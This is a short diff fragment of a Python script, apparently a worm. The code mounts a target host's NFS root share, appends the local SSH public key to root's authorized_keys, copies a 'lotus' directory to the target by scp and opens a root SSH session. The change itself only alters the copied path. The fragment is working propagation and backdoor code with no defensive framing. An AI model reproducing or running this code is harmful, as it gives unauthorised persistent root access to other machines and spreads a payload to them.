@@ -48,7 +48,7 @@ def main():
             subprocess.run(['mount -t nfs ' + str(ip) + ':/ /tmp/r00t/'], shell=True)
             subprocess.run(['cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys'], shell=True)
             subprocess.run(['umount /tmp/r00t'], shell=True)
-            subprocess.run(['scp -r ~/lotus root@' + str(ip) + ':/'], shell=True)
+            subprocess.run(['scp -r /lotus root@' + str(ip) + ':/'], shell=True)
             subprocess.run(['ssh root@'  + str(ip)], shell=True)                 
 def main():
     worm()
